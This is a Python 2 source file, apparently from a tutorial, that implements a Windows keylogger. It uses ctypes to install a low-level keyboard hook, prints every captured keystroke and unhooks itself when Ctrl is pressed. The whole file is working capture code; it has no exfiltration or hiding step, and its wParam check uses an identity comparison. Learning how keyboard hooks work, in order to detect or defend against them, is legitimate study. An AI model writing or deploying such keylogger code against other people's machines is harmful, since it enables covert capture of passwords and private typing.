import sys
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD

user32 = windll.user32                                                            #(1)
kernel32 = windll.kernel32

WH_KEYBOARD_LL=13                                                                 #(2)
WM_KEYDOWN=0x0100
CTRL_CODE = 162

class KeyLogger:                                                                  #(3)
    def __init__(self):
        self.lUser32     = user32
        self.hooked     = None
    
    def installHookProc(self, pointer):                                           #(4)
        self.hooked = self.lUser32.SetWindowsHookExA( 
                        WH_KEYBOARD_LL, 
                        pointer, 
                        kernel32.GetModuleHandleW(None), 
                        0
        )
        if not self.hooked:
            return False
        return True
    
    def uninstallHookProc(self):                                                  #(5)
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

def getFPTR(fn):                                                                  #(6)
    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
    return CMPFUNC(fn)

def hookProc(nCode, wParam, lParam):                                              #(7)
    if wParam is not WM_KEYDOWN:
        return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)

    hookedKey = chr(lParam[0])
    print hookedKey

    if(CTRL_CODE == int(lParam[0])):
        print "Ctrl pressed, call uninstallHook()"
        keyLogger.uninstallHookProc()
        sys.exit(-1)

    return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)     

def startKeyLog():
     msg = MSG()
     user32.GetMessageA(byref(msg),0,0,0)
    
keyLogger = KeyLogger() #start of hook process
pointer = getFPTR(hookProc) 

if keyLogger.installHookProc(pointer):
    print "installed keyLogger"

startKeyLog()
